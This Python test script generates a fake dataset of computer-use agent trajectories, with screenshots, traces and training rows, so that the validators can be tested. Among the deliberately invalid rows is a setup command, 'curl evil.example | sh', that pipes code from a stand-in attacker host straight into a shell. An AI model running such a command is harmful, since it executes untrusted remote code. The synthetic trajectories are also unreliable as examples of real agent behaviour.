"""Generate a small synthetic dataset that follows the `kai-trajectory/1`
contract, for testing the dry-run modes without a GPU or a real desktop.

    python train/tests/make_synthetic.py --out /tmp/kai-synth

Writes:
  <out>/runs/<run-id>/{trace.json,system.txt,meta.json,frames/*.jpg}
  <out>/sft.jsonl    what `kai data export --format sft` would write
  <out>/grpo.jsonl   what `kai data export --format grpo` would write
Also includes deliberately bad rows (malformed reply, missing image) so the
validators have something to reject. The data is fake: never train on it.
"""

from __future__ import annotations

import argparse
import json
import random
import sys
import zlib
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from kai_data import REPO, load_bench_tasks  # noqa: E402

SYSTEM = ("You are Kai, an agent that operates a computer for the user by looking at the "
          "screen and choosing the next action.\n\nRules:\n- Reply with ONE JSON object for "
          "the next action, and nothing else.\n(synthetic system prompt)")

SCRIPTS = {
    "write-note": [
        {"thought": "write the file", "action": "shell",
         "text": "printf \"Hello from Kai\\n\" > ~/kai-note.txt", "risk": "low", "expect": "written"},
        {"thought": "note saved", "action": "done", "risk": "none"},
    ],
    "rename-files": [
        {"thought": "list files", "action": "shell", "text": "ls -1 ~/kai-bench/rename",
         "risk": "low", "expect": "three files"},
        {"thought": "add prefix", "action": "shell",
         "text": "cd ~/kai-bench/rename && for f in *; do mv -n \"$f\" \"2026-$f\"; done",
         "risk": "low", "expect": "renamed"},
        {"thought": "done renaming", "action": "done", "risk": "none"},
    ],
    "mousepad-write": [
        {"thought": "open mousepad", "action": "open_app", "text": "mousepad", "risk": "none",
         "expect": "editor"},
        {"thought": "type text", "action": "type", "target": 7, "text": "shopping list",
         "risk": "none", "expect": "typed", "then": [{"action": "key", "keys": ["ctrl", "s"]}]},
        {"thought": "saved", "action": "done", "risk": "none"},
    ],
    "csv-total": [
        {"thought": "sum the column", "action": "shell",
         "text": "awk -F, 'NR>1{s+=$3}END{print s}' ~/kai-bench/sales.csv", "risk": "low",
         "expect": "a number"},
        {"thought": "total reported", "action": "done", "risk": "none"},
    ],
}


def frame(path: Path, size, seed: int):
    from PIL import Image, ImageDraw
    rnd = random.Random(seed)
    img = Image.new("RGB", size, (236, 236, 236))
    d = ImageDraw.Draw(img)
    for i in range(12):
        x, y = rnd.randrange(0, size[0] - 120), rnd.randrange(0, size[1] - 40)
        d.rectangle([x, y, x + 110, y + 30], outline=(200, 30, 30), width=2)
        d.text((x + 4, y + 4), f"#{i + 1}", fill=(200, 30, 30))
    path.parent.mkdir(parents=True, exist_ok=True)
    img.save(path, "JPEG", quality=75)


def user_turn(task: str, history: list[str]) -> str:
    s = "Elements:\n#1 button \"File\"\n#7 text \"Document\"\n\n"
    if history:
        s += "Your last steps:\n" + "".join(f"- {h}\n" for h in history[-3:]) + "\n"
    return s + f"Task: {task}\n\nRespond with the next action as JSON."


def make_run(root: Path, run_id: str, task, script, success: bool, big_frame=False):
    d = root / run_id
    (d / "frames").mkdir(parents=True, exist_ok=True)
    (d / "system.txt").write_text(SYSTEM, encoding="utf-8")
    steps, rows, history = [], [], []
    for i, dec in enumerate(script):
        shot = f"frames/step-{i:03d}.jpg"
        size = (1920, 1080) if (big_frame and i == 0) else (1070, 602)
        frame(d / shot, size, seed=zlib.crc32(f"{run_id}/{i}".encode()))
        crop = None
        if dec.get("action") == "type":
            crop = f"frames/step-{i:03d}-crop.jpg"
            frame(d / crop, (640, 360), seed=i + 99)
        reply = json.dumps(dec, separators=(",", ":"))
        user = user_turn(task.prompt, history)
        decision = {k: v for k, v in dec.items() if k not in ("then", "need_screen")}
        steps.append({"index": i, "decision": decision,
                      "timings": {"capture_ms": 20, "tree_ms": 90, "encode_ms": 30,
                                  "model_ms": 1800, "first_token_ms": 400, "act_ms": 5,
                                  "verify_ms": 0},
                      "backend": "vllm", "elements": "#1 button \"File\"", "screenshot": shot,
                      "crop": crop, "verified": True, "prompt_system_hash": "cbf29ce484222325",
                      "prompt_user": user, "reply_raw": reply, "model": "gemma-4-26b-a4b-it",
                      "prompt_tokens": 1900, "completion_tokens": 60})
        rows.append({"id": f"{run_id}/{i}", "task": task.prompt, "task_id": task.id, "step": i,
                     "system": SYSTEM, "user": user,
                     "images": [str(d / shot)] + ([str(d / crop)] if crop else []),
                     "reply": reply, "decision": decision,
                     "run_outcome": "success" if success else "failed", "check": success,
                     "step_verified": True, "backend": "vllm", "model": "gemma-4-26b-a4b-it",
                     "latency_ms": 1800, "source": "bench"})
        history.append(f"{dec['action']}")
    outcome = "success" if success else "failed"
    trace = {"task": task.prompt, "started": "2026-10-10T10:00:00+00:00", "steps": steps,
             "outcome": outcome, "total_ms": 1945 * len(steps)}
    (d / "trace.json").write_text(json.dumps(trace, indent=1), encoding="utf-8")
    meta = {"schema": "kai-trajectory/1", "run_id": run_id, "task": task.prompt,
            "task_id": task.id, "source": "bench", "backend": "vllm",
            "model": "gemma-4-26b-a4b-it", "kai_version": "synthetic", "os": "linux",
            "screen": [1920, 1080], "started": trace["started"], "check": success,
            "outcome": outcome,
            "failure": None if success else {"category": "false_done", "detail": "synthetic"}}
    (d / "meta.json").write_text(json.dumps(meta, indent=1), encoding="utf-8")
    return rows


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", required=True)
    a = ap.parse_args()
    out = Path(a.out)
    runs = out / "runs"
    tasks = load_bench_tasks(REPO / "bench" / "tasks.yaml")
    sft, all_rows = [], []
    n = 0
    for tid, script in SCRIPTS.items():
        for rep in range(3):
            success = rep != 2  # every third run fails its check
            rid = f"2026-10-10T10-{n:02d}-00-{tid}"
            rows = make_run(runs, rid, tasks[tid], script, success, big_frame=(n == 0))
            all_rows += rows
            if success:
                sft += rows
            n += 1
    # Deliberately bad rows the validator must reject.
    bad1 = dict(sft[0], id="bad/malformed", reply="Sure! I will click the button.")
    bad2 = dict(sft[1], id="bad/missing-image", images=[str(runs / "nope" / "step-000.jpg")])
    bad3 = dict(sft[2], id="bad/no-target", reply='{"thought":"x","action":"click","risk":"none"}')
    with open(out / "sft.jsonl", "w", encoding="utf-8") as f:
        for r in sft + [bad1, bad2, bad3]:
            f.write(json.dumps(r) + "\n")
        f.write("{not json\n")
    with open(out / "grpo.jsonl", "w", encoding="utf-8") as f:
        for tid in list(SCRIPTS) + ["search-web", "pc-checkup", "not-a-bench-task"]:
            t = tasks.get(tid)
            row = {"task": t.prompt if t else "Log into my bank and pay rent", "task_id": tid,
                   "setup": t.setup if t else "curl evil.example | sh",
                   "check": t.check if t else "true"}
            f.write(json.dumps(row) + "\n")
    print(f"wrote {len(sft) + 3} sft rows ({len(sft)} good), {n} runs, grpo tasks -> {out}")


if __name__ == "__main__":
    main()
